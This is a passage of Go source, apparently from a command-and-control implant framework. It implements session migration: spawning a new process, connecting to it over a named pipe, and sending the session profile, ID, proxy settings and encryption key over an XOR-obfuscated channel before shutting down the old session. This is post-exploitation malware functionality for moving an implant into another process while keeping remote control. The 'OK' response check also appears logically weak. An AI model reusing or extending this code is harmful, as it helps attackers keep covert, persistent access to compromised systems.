	if err = e.Start(); err != nil {
		return 0, err
	}
	if cout.Enabled {
		s.log.Debug("[%s/SpN] Started PID %d, waiting %s for pipe %q..", s.ID, e.Pid(), t, n)
	}
	c := spinTimeout(s.ctx, pipe.Format(n+"."+strconv.FormatUint(uint64(e.Pid()), 16)), t)
	if c == nil {
		s.state.Unset(stateMoving)
		return 0, ErrNoConn
	}
	if cout.Enabled {
		s.log.Debug("[%s/SpN] Received connection to %q!", s.ID, c.RemoteAddr().String())
	}
	var (
		w   = crypto.NewWriter(crypto.XOR(n), c)
		r   = crypto.NewReader(crypto.XOR(n), c)
		buf = [8]byte{0, 0, 0xF, 0, 0, 0, 0, 0}
		_   = buf[7]
	)
	if err = writeFull(w, 3, buf[0:3]); err != nil {
		c.Close()
		return 0, err
	}
	if err = writeSlice(w, &buf, b); err != nil {
		c.Close()
		return 0, err
	}
	buf[0], buf[1] = 0, 0
	if err = readFull(r, 2, buf[0:2]); err != nil {
		c.Close()
		return 0, err
	}
	if c.Close(); buf[0] != 'O' && buf[1] != 'K' {
		return 0, xerr.Sub("unexpected OK value", 0x16)
	}
	if cout.Enabled {
		s.log.Info("[%s/SpN] Received 'OK' from new process, Spawn complete!", s.ID)
	}
	return e.Pid(), nil
}

// MigrateProfile will execute the provided runnable and will wait up to the
// provided duration to transfer execution control to the new runnable using a
// Pipe connection with the name provided.
//
// This function uses the provided profile bytes unless the byte slice is empty,
// then this will use the Profile that was used to create this Session. This
// will fail if the Profile is not binary Marshalable.
//
// If 'wait' is true, this will wait for all events to complete before starting
// the Migration process.
//
// The provided JobID will be used to indicate to the server that the associated
// Migration Task was completed, as the new client will sent a 'RvMigrate' with
// the associated JobID once Migration has completed successfully.
//
// The return values for this function are the new PID used and any errors that
// may have occurred during Migration.
func (s *Session) MigrateProfile(wait bool, n string, b []byte, job uint16, t time.Duration, e runnable) (uint32, error) {
	if s.s != nil {
		return 0, xerr.Sub("must be a client session", 0x21)
	}
	if s.isMoving() {
		return 0, xerr.Sub("migration in progress", 0x22)
	}
	if len(n) == 0 {
		return 0, xerr.Sub("empty or invalid loader name", 0x14)
	}
	var err error
	if len(b) == 0 {
		// ^ Use our own Profile if one is not provided.
		p, ok := s.p.(marshaler)
		if !ok {
			return 0, xerr.Sub("cannot marshal Profile", 0x25)
		}
		if b, err = p.MarshalBinary(); err != nil {
			return 0, xerr.Wrap("cannot marshal Profile", err)
		}
	}
	if !s.checkProxyMarshal() {
		return 0, xerr.Sub("cannot marshal Proxy data", 0x27)
	}
	if cout.Enabled {
		s.log.Info("[%s/Mg8] Starting Migrate process!", s.ID)
	}
	s.lock.Lock()
	if s.state.Set(stateMoving); wait && s.m.count() > 0 {
		if cout.Enabled {
			s.log.Debug("[%s/Mg8] Waiting for all Jobs to complete..", s.ID)
		}
		for s.m.count() > 0 {
			if time.Sleep(time.Millisecond * 500); cout.Enabled {
				s.log.Trace("[%s/Mg8] Waiting for Jobs, left %d..", s.ID, s.m.count())
			}
		}
	}
	if len(s.jobs) > 0 {
		// ^ NOTE(dij): I don't think client sessions will have Jobs tbh.
		//              This might be a NOP.
		for _, j := range s.jobs {
			if j.cancel != nil && !j.IsDone() {
				if j.cancel(); cout.Enabled {
					s.log.Trace("[%s/Mg8] Canceling JobID %d..", s.ID, j.ID)
				}
			}
		}
	}
	if t <= 0 {
		t = spawnDefaultTime
	}
	if err = e.Start(); err != nil {
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	if cout.Enabled {
		s.log.Debug("[%s/Mg8] Started PID %d, waiting %s for pipe %q..", s.ID, e.Pid(), t, n)
	}
	c := spinTimeout(s.ctx, pipe.Format(n+"."+strconv.FormatUint(uint64(e.Pid()), 16)), t)
	if c == nil {
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, ErrNoConn
	}
	if cout.Enabled {
		s.log.Debug("[%s/Mg8] Received connection from %q!", s.ID, c.RemoteAddr().String())
	}
	var (
		w   = crypto.NewWriter(crypto.XOR(n), c)
		r   = crypto.NewReader(crypto.XOR(n), c)
		buf = [8]byte{byte(job >> 8), byte(job), 0xD, 0, 0, 0, 0, 0}
		_   = buf[7]
	)
	if err = writeFull(w, 3, buf[0:3]); err != nil {
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	if err = writeSlice(w, &buf, b); err != nil {
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	if err = s.ID.Write(w); err != nil {
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	if err = s.writeProxyInfo(w, &buf); err != nil {
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	if _, err = w.Write(s.key[:]); err != nil {
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	buf[0], buf[1], buf[2], buf[3] = 0, 0, 'O', 'K'
	if err = readFull(r, 2, buf[0:2]); err != nil {
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, err
	}
	if buf[0] != 'O' && buf[1] != 'K' {
		c.Close()
		s.state.Unset(stateMoving)
		s.lock.Unlock()
		return 0, xerr.Sub("unexpected OK value", 0x16)
	}
	if s.state.Set(stateClosing); cout.Enabled {
		s.log.Debug("[%s/Mg8] Received 'OK' from host, proceeding with shutdown!", s.ID)
	}
	if s.lock.Unlock(); s.proxy != nil && s.proxy.IsActive() {
		s.proxy.Close()
	}
	s.state.Set(stateClosing)
	for s.Wake(); ; {
		if time.Sleep(500 * time.Microsecond); s.state.Closed() {
			break
		}
	}
	if s.lock.Lock(); cout.Enabled {
		s.log.Debug("[%s/Mg8] Got lock, migrate completed!", s.ID)
	}
	w.Write(buf[2:4])
	w.Close()
	c.Close()
	e.Release()
	close(s.ch)
	return e.Pid(), nil
}
